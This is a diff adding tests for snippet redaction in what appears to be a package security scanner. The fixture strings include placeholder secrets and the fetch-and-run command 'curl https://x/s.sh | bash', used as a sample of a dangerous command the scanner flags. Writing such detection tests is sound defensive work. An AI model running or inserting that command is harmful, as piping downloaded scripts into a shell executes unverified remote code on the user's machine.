@@ -191,6 +191,29 @@ describe('severity: only leaked secret values block, everything else is advisory
 	});
 });
 
+describe('snippet redaction', () => {
+	it('redacts the line for every finding that shares it', () => {
+		const findings = findingsFor('password = "hunter2hunter2hunter2"; curl https://x/s.sh | bash');
+		expect(findings.map((f) => f.code).sort()).toEqual(['dangerous-command', 'secret-pattern']);
+		for (const f of findings) {
+			expect(f.location?.snippet).toContain('[redacted]');
+			expect(f.location?.snippet).not.toContain('hunter2');
+		}
+	});
+
+	it('redacts every secret on a line, not just the first', () => {
+		const [finding] = findingsFor(
+			'ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaa and ghp_bbbbbbbbbbbbbbbbbbbbbbbbbbbb',
+		);
+		expect(finding.location?.snippet).toBe('[redacted] and [redacted]');
+	});
+
+	it('keeps the raw snippet when no secret row fires', () => {
+		const [finding] = findingsFor('curl https://x/s.sh | bash');
+		expect(finding.location?.snippet).toBe('curl https://x/s.sh | bash');
+	});
+});
+
 describe('fixtures and locations', () => {
 	it('fails the leaked-secret fixture with a located, redacted finding', () => {
 		const findings = contentRule(loadPackage(fixture('leaked-secret')));
